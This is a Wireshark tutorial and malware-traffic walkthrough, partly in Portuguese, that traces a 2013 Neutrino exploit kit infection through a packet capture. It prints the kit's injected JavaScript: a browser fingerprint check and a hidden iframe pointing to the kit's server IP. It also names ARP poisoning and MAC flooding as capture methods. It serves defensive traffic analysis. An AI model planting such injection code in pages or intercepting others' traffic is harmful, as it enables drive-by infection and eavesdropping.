# WiresharkNetworkPatterns
Documentation focused on pattern discovery in Wireshark, useful for identifying malware, suspicious behavior, and other types of unusual activity.
First, I'll give a very basic overview of Wireshark, and later in this documentation I'll focus in detail on pattern discovery using Malware-Traffic-Analysis.net.

<img width="373" height="327" alt="image" src="https://github.com/user-attachments/assets/ec8f96a9-dc05-439b-a8ac-678cc5e566cd" />

# Starts Here #

1. Fundamentals and Overview (Wireshark 101)
Wireshark is an essential tool for creating and analyzing PCAP (network packet capture) files.

Main Interface: Allows you to specify interfaces for live capture or load existing PCAP files.

Packet Display: Provides critical information such as packet number, time, origin, destination, protocol, length, and general information.

Visual Highlighting: Uses color codes to identify danger levels and different protocols, facilitating visual detection of anomalies.

2. Data Collection Methods
To analyze traffic, you must first know how to collect it:

Network Taps: Physical implants between cables to intercept traffic.

MAC Flooding: Technique to stress the switch until it sends packets to all ports, allowing eavesdropping.

ARP Poisoning: Redirects traffic from a host to your own monitoring machine.

3. Operations and Packet Filtering
Filtering is the heart of efficient analysis, especially in large captures.

Capture Filters: Defined before capture to save only specific parts of the traffic (e.g., tcp port 80).

Display Filters: Changeable during analysis to reduce visible packets (e.g., tcp.port == 80).

Logical Operators: Use and (&&), or (||), eq (==), ne (!=), gt (>), and lt (<) to create complex queries.

Advanced Filters: * contains: Searches for specific values ​​within fields (e.g., http.server contains "Apache").

matches: Allows the use of regular expressions.

upper/lower: Converts strings to uppercase/lowercase to avoid case-sensitivity errors.

4. OSI Layer and Protocol Analysis
Wireshark dissects packets following the OSI model (Layers 1 to 7).

ARP (Layer 2): Connects IPs to MAC addresses. Check the opcodes: 1 for request and 2 for response.

ICMP (Layer 3): Used for diagnostics (ping/traceroute). Type 8 indicates a request and 0 indicates a response. Anomalies in packet size (>64 bytes) may indicate tunneling.

TCP (Layer 4): Focused on the three-way handshake (SYN, SYN-ACK, ACK).

DNS (Layer 7): Resolves names to IPs. DNS traffic in TCP 53 or queries with very long/encoded names are signs of suspicious activity (e.g., data exfiltration).

HTTP/HTTPS: HTTP sends data in plain text (GET/POST). HTTPS uses TLS for encryption, requiring decryption keys (SSLKEYLOGFILE) to view the content.

5. Traffic Analysis and Attack Patterns

To identify threats, you should look for specific patterns:

Nmap Scans: * TCP Connect: Complete handshake, usually with window_size > 1024.

SYN Scan: Does not complete the handshake, usually with window_size <= 1024.

UDP Scan: Identified by ICMP Type 3 Code 3 errors (unreachable port).

Man-in-the-Middle (MITM) Attack: Detected by ARP conflicts (two MACs claiming the same IP) or when the attacker's MAC becomes the destination of all HTTP traffic.

Credential Hunting: Wireshark has a menu in Tools -> Credentials that automatically extracts clear text passwords from protocols such as FTP and HTTP.

Log4j Vulnerability: Search for text patterns such as jndi:ldap or Exploit.class in POST requests.

6. Statistics and Auxiliary Tools

Protocol Hierarchy: Shows the protocol distribution in the capture to identify statistical anomalies.

Endpoints & Conversations: Lists all IPs and unique communications, allowing you to map who is talking to whom.

Firewall ACL Rules: Wireshark can generate ready-made firewall rules (iptables, Cisco IOS, etc.) based on selected packets to quickly block threats.

# WALKTHROUGH: MALWAREANALYSIS.NET #

01 - NEUTRIN(2013-06-18)
Após realizar algumas pesquisas é possível entender que foi um ataque muito famoso entre 2013 e 2017, então já existem vários padrões identificados!

O primeiro deles é o padrão de URL: [domínio]/[palavra-aleatória].php?seed=[caracteres] (Costumam ser assim) abaixo, usando o filtro http.request, Podemos observar o mesmo padrão:

É interessante notar que também peguei um filtro novo (Host) dentro de hypertext transfer protocol

<img width="1755" height="462" alt="image" src="https://github.com/user-attachments/assets/350b3935-7f85-4094-97cb-2379d7315dcb" />

, Usei também o filtro Conent-type(dentro do  HTTP e arrastei pras colunas!) 

HTTP.content_type contains "application":

<img width="1836" height="797" alt="image" src="https://github.com/user-attachments/assets/afae6c9f-eb8f-4e93-a75c-6e4ab387ba73" />

Usando o tcp.stream eq 0:

<img width="1884" height="807" alt="image" src="https://github.com/user-attachments/assets/f2f9cfd7-60d0-4c66-89a8-b2882ee8ef48" />

Olhando com mais detalhes é possível encontrar isto!

<img width="1835" height="848" alt="image" src="https://github.com/user-attachments/assets/8ad779ef-224f-4538-a19e-bc17aa5b4b99" />

Que é nada mais nada menos que a injeção maliciosa, pesquisando mais sobre é possível identificar o que ela faz:

<img width="1835" height="848" alt="image" src="https://github.com/user-attachments/assets/6d235fdd-0d7e-4e33-bf48-3785d2b73960" />

"Analise do código":
O Mecanismo de Fingerprinting
As funções browserDetectNav e showBrowVer servem para identificar se a vítima é um alvo "interessante". O código verifica:

Sistema Operacional: Ele busca por Windows, Linux, Mac, etc.

Navegador e Versão: Ele testa especificamente se o usuário está usando Internet Explorer (MSIE) versão 8 ou superior, Firefox ou Opera.

2. A Condição de Ataque (O "Filtro")
A parte mais crítica está aqui:

JavaScript

if ((data[0] == 'Opera' || (data[0] == 'MSIE' & data[1] >= 8) || data[0] == 'Firefox') & data[3] == 'Windows')
O Exploit Kit só vai agir se você estiver no Windows e usando um desses navegadores. Se você estiver no Linux ou Mac, o código não faz nada. Isso serve para não "desperdiçar" o exploit em sistemas que ele não consegue infectar e para evitar detecção por pesquisadores de segurança.

3. O Redirecionamento (O Iframe Malicioso)
Se a vítima passar no teste acima, o código executa o redirecionamento silencioso:

JavaScript

var js_kod2 = document.createElement('iframe');
js_kod2.src = 'http://93.171.172.220/?1';
js_kod2.width = '5px';
js_kod2.height = '6px';
js_kod2.setAttribute('style','visibility:hidden');
Ele cria um iframe invisível (escondido e com tamanho minúsculo).

O src aponta para o IP 93.171.172.220/?1. Este é o servidor do Neutrino EK.

Com estas informações de pesquisa podemos filtrar por ip.addr == 93.171.172.220, já que agora entendemos se tratar do servidor do Neutrino!

<img width="1856" height="826" alt="image" src="https://github.com/user-attachments/assets/c36f9318-f91d-4e85-acbc-549134f77a7d" />

Nessa lista, procuramos pelo primeiro pacote HTTP GET feito para esse IP. Geralmente, a URL será algo curto como /?1. Essa é a sua Landing Page.

Usando o tcp stream novamente mas dessa vez no primeiro get do endereço em questão :
<img width="1682" height="894" alt="image" src="https://github.com/user-attachments/assets/86cd9375-d2a4-4f2d-a7a2-f7db90f6cbb6" />

Identificação do Exploit Java
Request (Vermelho): O GET possui um nome de arquivo aleatório (/cbsthcfq?...), o que é típico de kits de exploração para evitar assinaturas estáticas.

User-Agent: Note que quem está pedindo o arquivo não é mais o navegador IE8 puro, mas sim o Java/1.6.0_25. Isso indica que o código da Landing Page conseguiu ativar o plugin do Java no computador da vítima para baixar o exploit.

Content-Type: O servidor responde com application/java-archive, confirmando que o arquivo é um .jar.

2. Anatomia do Arquivo Malicioso (O corpo do Stream)
Olhando para o texto azul (ASCII), podemos ver a estrutura interna do arquivo Java:

Assinatura PK: Os primeiros caracteres PK indicam que este é um arquivo comprimido (ZIP/JAR).

META-INF/MANIFEST.MF: Este é o arquivo de configuração padrão do Java.

Nomes de Classes: Você pode ver strings como Art.class. Em um exploit real do Neutrino, essas classes costumam estar ofuscadas para esconder o código que explora vulnerabilidades como a CVE-2013-2465 ou similares daquela época.

Para encontrar o malware final agora, use este filtro no Wireshark:
http.request.method == "GET" && ip.src == 192.168.122.178
O malware final vai ser o próximo pacote get depois do pacote java:
<img width="1644" height="342" alt="image" src="https://github.com/user-attachments/assets/4e1a3370-8a28-4041-bf69-85e6127184f6" />

Achamos o exploit! É só dar um HTTP stream e após pesquisa encontro esta analise:

1. Identificação do Binário (Assinatura MZ)
No final do bloco de dados que você enviou, é possível ver claramente a assinatura:

...ylhMzfY-h.u...

O caractere MZ (que aparece como Mz no seu stream) são os dois primeiros bytes de qualquer arquivo executável do Windows (Portable Executable - PE). Isso confirma que o Exploit Kit Neutrino teve sucesso em explorar a vulnerabilidade Java e agora está enviando o arquivo ".exe" malicioso para execução.

2. Ofuscação do Tráfego
Note que o conteúdo do arquivo parece "lixo" ou texto repetitivo (como as strings ylh, vwn, wny que se repetem exaustivamente).

XOR ou Substituição: O Neutrino frequentemente utiliza uma cifra simples (como XOR) para "mascarar" o executável durante a transmissão pela rede.

Evasão: Isso é feito para que firewalls e antivírus de rede (IPS/IDS) não reconheçam o arquivo como um executável malicioso enquanto ele passa pelo cabo. O malware "descompacta" ou "descriptografa" esse binário na memória assim que o download termina.

3. Análise dos Cabeçalhos HTTP
Content-Length: 93696: O malware possui aproximadamente 91 KB.

Server: nginx/1.4.1: O atacante está utilizando um servidor Nginx, muito comum em infraestruturas de Exploit Kits por sua performance.

User-Agent: Observe que o User-Agent continua sendo o do Java (Java/1.6.0_25), provando que o processo Java que você identificou anteriormente é quem está "puxando" o arquivo final para o disco.

Próximo Passo Sugerido
Para confirmar o que esse malware faz, você pode tentar extrair esse objeto do Wireshark:

Vá em File > Export Objects > HTTP.

Selecione o arquivo associado à URL /drddbg?mebhqtwycgg=nshbdaiqnay.

Salve o arquivo e verifique o hash dele em sites como o VirusTotal para identificar a família do malware (nesta época, o Neutrino costumava distribuir Ransomwares ou Banking Trojans como o Zeus/Zbot).

Após jogar no Virustotal:
<img width="1701" height="648" alt="image" src="https://github.com/user-attachments/assets/0062578c-52f0-4a39-ac46-a637eedd4c01" />
Jogando um outro amigo dele!
<img width="1629" height="764" alt="image" src="https://github.com/user-attachments/assets/9ccec9f8-1821-4547-9d46-a5bcd9734d67" />

Encerramos por aqui! Até a próxima analise!


